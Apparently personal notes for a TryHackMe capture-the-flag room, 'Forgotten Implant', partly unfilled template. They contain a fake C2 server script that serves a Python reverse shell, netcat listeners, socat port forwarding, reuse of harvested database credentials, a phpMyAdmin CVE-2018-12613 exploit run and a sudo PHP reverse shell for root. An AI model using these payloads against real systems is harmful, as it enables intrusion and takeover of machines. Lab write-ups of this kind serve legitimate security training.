---
creation date: July 28th 2023
last modified date: July 28th 2023
aliases: []
tags: #🎌
---

Primary Categories: 
Secondary Categories:  
Links: 
Search Tag: #🎌  

# [[THM - Forgotten Implant]]  


# Resolution summary
- Text
- Text

## Improved skills
- skill 1
- skill 2

## Used tools
- [[nmap]]
- 

---

# Information Gathering
Scanned all TCP ports:
```bash
All 65535 scanned ports on 10.10.80.84 are in ignored states.
Not shown: 64630 closed tcp ports (conn-refused), 905 filtered tcp ports (no-response)
```

Enumerated open TCP ports:
```bash

```

Enumerated top 200 UDP ports:
```bash
All 65535 scanned ports on 10.10.80.84 are in ignored states.
Not shown: 65503 open|filtered udp ports (no-response), 32 closed udp ports (port-unreach)
```

---

# Enumeration
## Port 81
Listening for a callback from the host and we found that this port gives us:
```
GET /heartbeat/eyJ0aW1lIjogIjIwMjMtMDctMjlUMTg6MzQ6MDEuODA3NjE0IiwgInN5c3RlbWluZm8iOiB7Im9zIjogIkxpbnV4IiwgImhvc3RuYW1lIjogImZvcmdvdHRlbmltcGxhbnQifSwgImxhdGVzdF9qb2IiOiB7ImpvYl9pZCI6IDAsICJjbWQiOiAid2hvYW1pIn0sICJzdWNjZXNzIjogZmFsc2V9 HTTP/1.1
Host: 10.13.0.100:81
User-Agent: python-requests/2.22.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```


---

# Exploitation
## Name of the technique


---

# Lateral Movement to user
## Local Enumeration
### ada
```
cat products.py
import mysql.connector

db = mysql.connector.connect(
    host='localhost', 
    database='app', 
    user='app', 
    password='s4Ucbrme'
    )

cursor = db.cursor()
cursor.execute('SELECT * FROM products')

for product in cursor.fetchall():
    print(f'We have {product[2]}x {product[1]}')
```





## Lateral Movement vector


---

# Privilege Escalation
## Local Enumeration


## Privilege Escalation vector

# Blog notes
1. export RHOST=10.10.164.197
2. nmap -p- --min-rate 10000 $RHOST
3. sudo tcpdump -i tun0
4. python -m http.server 81
	1. GET /heartbeat/eyJ0aW1lIjogIjIwMjMtMDgtMDFUMDI6MTI6MDIuMDk5NDcxIiwgInN5c3RlbWluZm8iOiB7Im9zIjogIkxpbnV4IiwgImhvc3RuYW1lIjogImZvcmdvdHRlbmltcGxhbnQifSwgImxhdGVzdF9qb2IiOiB7ImpvYl9pZCI6IDAsICJjbWQiOiAid2hvYW1pIn0sICJzdWNjZXNzIjogZmFsc2V9
	2. GET /get-job/ImxhdGVzdCI=
5. python server.py
	1. GET /job-result/eyJqb2JfaWQiOiAxNSwgImNtZCI6ICJ3aG9hbWkiLCAic3VjY2VzcyI6IHRydWUsICJyZXN1bHQiOiAiYWRhXG4ifQ==
6. rlwrap -cAr nc -lvnp 9001
7. SHELL
	1. ls
	2. cat user.txt
	3. cat products.py
	4. ss -tulpn
		1. Shows that there is a server listening on port 80
		2. This port isnt accessible from the outside world so why dont we make it
8. Download [socat](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat) binary onto our machine and setup a python server to transfer it
	1. python -m http.server 9002
9. SHELL
	1. wget http://10.13.0.100:9002/socat
	2. chmod +x socat
	3. ./socat TCP4-LISTEN:8080,fork TCP4:127.0.0.1:80
10. We can now connect to the exposed phpmyadmin server via a web browser
	1. Once here we use the creds found in products.py and sign in
	2. We see that its running version 4.8.1 so lets look at that on exploit-db
		1. We can see that there is a RCE [CVE-2018-12613](https://nvd.nist.gov/vuln/detail/CVE-2018-12613)
		2. Lets download this [exploit](https://www.exploit-db.com/raw/50457)
		3. Lets test it out with a simple **whoami**
			1. python 50457 $RHOST 8080 / app s4Ucbrme 'sudo whoami'
				1. We see we are **www-data**
			2. python 50457 $RHOST 8080 / app s4Ucbrme 'sudo -l'
				1. We have access to run php files sudo with NOPASSWD
11. At this point the path to root is really simple
	1. Firstly lets start by copying a **php-reverse-shell.php** to a directory that we can host a python server
		1. Kali has these under `cp /usr/share/webshells/php/php-reverse-shell.php .`
	2. Next lets start our python server that will be hosting the php reverse shell
		1. `python -m http.server 9002`
	3. Third start a listener on the port we assigned to the php shell
		1. `rlwrap -cAr nc -lvnp 9003`
	4. We will now need to disconnect from our shell with **ada** with CTRL-C so we can transfer our new shell and currently this user is held up with the socat command (don't worry that port is still forwarded)
	5. Reconnect to user **ada** using our initial foothold exploit
	6. Once connected as **ada** download our exploit from our machine to the target
		1. `wget http://10.13.0.100:9002/php-reverse-shell.php`
			1. We can do this in ada's home directory
12. Once the shell has been uploaded to forgottenimplant all the pieces are in place
13. Run the exploit again this time calling the reverse shell using sudo
	1. `python 50457 $RHOST 8080 / app s4Ucbrme 'sudo /usr/bin/php /home/ada/php-reverse-shell.php'`
14. We are root!
15. Starting in the / directory we can navigate to /root directory and find the root.txt flag is a hidden file



## Code Blocks
### server.py
```python
import http.server
import socketserver
import base64

PORT = 81

class MyRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()

        # Data to be encoded in base64
        data = b'{"job_id": 15, "cmd": "whoami"}'
        data = b'{"job_id": 15, "cmd": "python3 -c \'import os,pty,socket;s=socket.socket();s.connect((\\"10.13.0.100\\",9001));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\\"/bin/bash\\")\'"}'
        

        # Base64-encode the data
        encoded_data = base64.b64encode(data)

        # Write the base64-encoded data to the response
        self.wfile.write(encoded_data)

with socketserver.TCPServer(("", PORT), MyRequestHandler) as httpd:
    print("Server listening on port", PORT)
    httpd.serve_forever()
```


### products.py
```python
import mysql.connector

db = mysql.connector.connect(
    host='localhost', 
    database='app', 
    user='app', 
    password='s4Ucbrme'
    )

cursor = db.cursor()
cursor.execute('SELECT * FROM products')

for product in cursor.fetchall():
    print(f'We have {product[2]}x {product[1]}')
```




---

# Trophy & Loot

___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: July 28th 2023 (01:08 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
